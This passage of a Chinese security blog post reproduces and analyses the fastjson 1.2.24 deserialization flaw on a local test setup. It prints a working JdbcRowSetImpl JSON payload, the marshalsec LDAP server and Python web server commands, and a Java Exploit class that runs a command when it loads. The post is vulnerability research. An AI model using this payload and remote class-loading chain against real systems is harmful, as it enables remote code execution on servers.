+<h2 id="进入调用get的条件"><a href="#进入调用get的条件" class="headerlink" title="进入调用get的条件"></a>进入调用get的条件</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> String methodName = method.getName();</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">     methodName.length() &gt;= <span class="number">4</span> &amp;&amp; <span class="comment">// 方法名长度要大于等于4</span></span><br><span class="line">     !Modifier.isStatic(method.getModifiers()) &amp;&amp;  <span class="comment">// 不是静态方法</span></span><br><span class="line">     methodName.startsWith(<span class="string">"get"</span>) &amp;&amp;  <span class="comment">// 以get字符串开头</span></span><br><span class="line">     Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp;  <span class="comment">// 第4个字符要是大写字母</span></span><br><span class="line">     method.getParameterTypes().length == <span class="number">0</span> &amp;&amp;  <span class="comment">// 方法不能有参数传入</span></span><br><span class="line"></span><br><span class="line">     (Collection.class.isAssignableFrom(method.getReturnType()) || </span><br><span class="line">     Map.class.isAssignableFrom(method.getReturnType()) || </span><br><span class="line">     AtomicBoolean.class == method.getReturnType() || </span><br><span class="line">     AtomicInteger.class == method.getReturnType() || </span><br><span class="line">     AtomicLong.class == method.getReturnType())) </span><br><span class="line">     <span class="comment">// 继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</span></span><br></pre></td></tr></table></figure>
+
+<p>继续走 走到 getOutputProperties 符合get的所有要求<br>并且将<code>getOutputProperties</code> 加入到 后面会进行调用的列表里<br><img src="/2020/12/16/复现及分析fastjson1-2-24/%E7%AC%A6%E5%90%88%E8%A6%81%E6%B1%82%E7%9A%84%E6%96%B9%E6%B3%95.jpg" alt="符合要求的方法.jpg">  </p>
+<p>可以看到列表里有 这个方法<br><img src="/2020/12/16/复现及分析fastjson1-2-24/%E5%86%99%E5%88%B0filedinfo.jpg" alt="写到filedinfo.jpg">  </p>
+<p>后面反射创建实例后调用方法设置 <code>_bytecodes</code>值  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-09-17-06-26.png" alt></p>
+<p>然后调用 getOutputProperties 我们跟进   </p>
+<p>要求_name不能为空 空的话直接返回了  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/nam%E4%B8%8D%E8%83%BD%E4%B8%BA%E7%A9%BA.jpg" alt="nam不能为空.jpg">  </p>
+<p>_bytecodes 不能为空<br><img src="/2020/12/16/复现及分析fastjson1-2-24/bytecodes%E4%B8%8D%E8%83%BD%E4%B8%BA%E7%A9%BA.jpg" alt="bytecodes不能为空.jpg">  </p>
+<p>然后继续<br>会调用 _tfacroty的getExternalExtensionsMap()方法 所以tfacroty要设置个{}<br><img src="/2020/12/16/复现及分析fastjson1-2-24/tfacroty.jpg" alt="tfacroty.jpg">  </p>
+<p>这里可以看到 tfacroty 不是一个空的{}<br><img src="/2020/12/16/复现及分析fastjson1-2-24/%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0tfactory%E4%B8%8D%E6%98%AF%E7%A9%BA%E7%9A%84.jpg" alt="这里可以看到tfactory不是空的.jpg">  </p>
+<p><code>tfactory 为啥不是空的</code> 是fastjson在这里对空的对象解析后会赋值应有的对象 在 TemplatesImpl里可以看到 <code>private transient TransformerFactoryImpl _tfactory = null;</code></p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/trfactory%E5%BA%94%E6%9C%89%E7%9A%84%E6%A0%BC%E5%BC%8F.jpg" alt="trfactory应有的格式.jpg"> </p>
+<p>并且跟进后可以看到有 getExternalExtensionsMap方法  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%9C%89getExternalEcensionsMap%E6%96%B9%E6%B3%95.jpg" alt="可以看到有getExternalEcensionsMap方法.jpg">  </p>
+<p>_class[_transletIndex] 就是我们的要执行的类  </p>
+<p>newInstance 会调用构造函数 类似new newInstance只能调用无参数的构造函数  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/_class%5B_transletIndex%5D.jpg" alt="_class[_transletIndex]">  </p>
+<p>下划线是怎么回事去掉的<br>在 JavaBeanDeserializer中会把set get方法的下划线去掉<br><img src="/2020/12/16/复现及分析fastjson1-2-24/JavaBeanDeserializer%E4%B8%AD%E4%BC%9A%E6%8A%8A%E4%B8%8B%E5%88%92%E7%BA%BF%E5%8E%BB%E6%8E%89.jpg" alt="JavaBeanDeserializer中会把下划线去掉.jpg">  </p>
+<p>poc中的 <code>_outputProperties</code> 去掉下划线也可以用<br>其他属性字段是不行的  </p>
+<h2 id="基于jndi-ldap方法的攻击链"><a href="#基于jndi-ldap方法的攻击链" class="headerlink" title="基于jndi ldap方法的攻击链"></a>基于jndi ldap方法的攻击链</h2><p>因为我本机的jdk不满足 rmi的条件 于是使用的ldap的方式来复现  </p>
+<p>ldap的方式是使用外部加载class的形式  </p>
+<p>payload  </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">	<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>,</span><br><span class="line">	<span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-marshalsec-构建-ldap服务"><a href="#使用-marshalsec-构建-ldap服务" class="headerlink" title="使用  marshalsec 构建 ldap服务"></a>使用  marshalsec 构建 ldap服务</h3><p>java环境：jdk1.8.0_161 &lt; 1.8u191 (可以使用ldap注入)<br>git 先下载下来<br><code>git clone git@github.com:mbechler/marshalsec.git</code>  </p>
+<p>mvn 编译成jar包 (mvn最好配置好国内的比如阿里的maven源)  </p>
+<p><code>mvn clean package -DskipTests</code>  </p>
+<p>最后target目录下输出  <code>marshalsec-0.0.3-SNAPSHOT-all.jar</code>  </p>
+<p>启动  <code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#Exploit</code>  </p>
+<p>这里是启动了个ldap 然后我们需要构建个简单的web服务返回exploit  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-15-06-25.png" alt="ldap启动">  </p>
+<h2 id="编写Exploit"><a href="#编写Exploit" class="headerlink" title="编写Exploit"></a>编写Exploit</h2><p>执行命令运行计算器  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span> <span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先直接运行 弹出计算器 在out目录下看到 Exploit.class  </p>
+<h2 id="启动简单web服务"><a href="#启动简单web服务" class="headerlink" title="启动简单web服务"></a>启动简单web服务</h2><p>简单实用python创建<br>这个是python2的命令<br><code>python -m SimpleHTTPServer 8081</code>  </p>
+<p>这个命令要在 Exploit.class 目录下执行 端口与上面marshalsec执行命令的端口一致  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-15-07-00.png" alt="简单web服务">  </p>
+<h2 id="postman发送请求"><a href="#postman发送请求" class="headerlink" title="postman发送请求"></a>postman发送请求</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">	<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>,</span><br><span class="line">	<span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-15-08-16.png" alt="弹出计算器">  </p>
+<p>断点调试  </p>
+<p>解析上传的json<br><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-11-17-30-56.png" alt="parse">  </p>
+<p>这次会被调用满足条件的是 <code>setAutoCommit</code> <code>setDataSourceName</code>  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/%E8%BF%99%E6%AC%A1%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%E7%9A%84%E6%98%AFset%E7%9A%84setautocommit.jpg" alt="这次可以调用的是set的setautocommit.jpg">  </p>
+<p>调用set方法的条件是  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法名长度大于4且以set开头，且第四个字母要是大写</span><br><span class="line"></span><br><span class="line">非静态方法</span><br><span class="line"></span><br><span class="line">返回类型为void或当前类</span><br><span class="line"></span><br><span class="line">参数个数为1个</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/set%E8%B0%83%E7%94%A8%E7%9A%84%E6%9D%A1%E4%BB%B6.jpg" alt="set调用的条件.jpg"> </p>
+<p>然后会设置dataSourceName值  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/%E8%AE%BE%E7%BD%AEdataSourceName%E5%80%BC.jpg" alt="设置dataSourceName值.jpg"> </p>
+<p>反射调用setDataSourceNmae  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8setDataSourceNmae.jpg" alt="反射调用setDataSourceNmae"> </p>
+<p>反射调用setAutoCommit  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8setAutoCommit.jpg" alt="反射调用setAutoCommit.jpg"> </p>
+<p>触发ldap里的lookup方法 并且里面的参数就是我们设置的远程地址 就上面开源的那个工具里很多可以利用的反序列化链<br><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-14-14-34-27.png" alt="触发ldap">  </p>
+<p>调用链  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-14-12-01-50.png" alt="ldap调用链">  </p>
+<p>可以清晰的看到从 testVuln 接口进入 parse解析json对象后解析字段 设置字段值<br>使用invoke动态调用set方法<br>可以看到 setAutoCommit的方法调用 这里触发漏洞<br>然后是对expoit类的实例化<br>远程调用这个expolit的类来实现执行<br>最后执行exec的方法  </p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li><p>基于TemplatesImpl的利用链<br>使用_outputProperties方法可以满足get的条件实现自动调用getOutputProperties 方法并且会使用到私有成员变量 <code>_bytecodes</code> 他又是可控的  </p>
+</li>
+<li><p>rmi 或者ldap方式<br>是使用基于远程加载类的方式 jndi有个setAutoCommit方式设置为True后会自动调用setValue方法<br>使用特定的set方法来自动调用 和可控的参数传入  </p>
+</li>
+</ol>
+<ol start="3">
+<li>java会对@type的类型通过 javaBeanInfo 来获取所有的属性和方法<br>通过特定条件过滤set和get方法 满足的进行调用 再与可控参数 可控的 @type类 实现命令执行  </li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/复现-漏洞分析/" rel="tag"># 复现 漏洞分析</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/09/Dsxs源码简单分析/" rel="next" title="Dsxs源码简单分析">
+                <i class="fa fa-chevron-left"></i> Dsxs源码简单分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/12/16/复现及分析fastjson后续漏洞/" rel="prev" title="复现及分析fastjson后续漏洞">
+                复现及分析fastjson后续漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Recar">
+  
+  <p class="site-author-name" itemprop="name">Recar</p>
+  <div class="site-description motion-element" itemprop="description">年轻人就应该多读源码多读书</div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+        
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+
+
+
+
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjosn-反序列化漏洞学习"><span class="nav-number">1.</span> <span class="nav-text">fastjosn 反序列化漏洞学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-24反序列化漏洞复现"><span class="nav-number">1.1.</span> <span class="nav-text">fastjson 1.2.24反序列化漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#先写一个正常的使用-fastjson的web服务"><span class="nav-number">1.2.</span> <span class="nav-text">先写一个正常的使用 fastjson的web服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简单写个路由解析"><span class="nav-number">1.2.1.</span> <span class="nav-text">简单写个路由解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#请求"><span class="nav-number">1.2.2.</span> <span class="nav-text">请求</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现及分析"><span class="nav-number">1.3.</span> <span class="nav-text">复现及分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于TemplatesImpl的复现与分析"><span class="nav-number">1.3.1.</span> <span class="nav-text">基于TemplatesImpl的复现与分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进入调用get的条件"><span class="nav-number">1.4.</span> <span class="nav-text">进入调用get的条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于jndi-ldap方法的攻击链"><span class="nav-number">1.5.</span> <span class="nav-text">基于jndi ldap方法的攻击链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-marshalsec-构建-ldap服务"><span class="nav-number">1.5.1.</span> <span class="nav-text">使用  marshalsec 构建 ldap服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编写Exploit"><span class="nav-number">1.6.</span> <span class="nav-text">编写Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#启动简单web服务"><span class="nav-number">1.7.</span> <span class="nav-text">启动简单web服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#postman发送请求"><span class="nav-number">1.8.</span> <span class="nav-text">postman发送请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.9.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Recar</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.2.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// GET RESPONSIVE HEIGHT PASSED FROM IFRAME
+
+window.addEventListener("message", function(e) {
+  var data = e.data;
+  if ((typeof data === 'string') && (data.indexOf('ciu_embed') > -1)) {
+    var featureID = data.split(':')[1];
+    var height = data.split(':')[2];
+    $(`iframe[data-feature=${featureID}]`).height(parseInt(height) + 30);
+  }
+}, false);
+</script>
+
+
+
+
+
+
+
+
+  
+
+</body>
+</html>
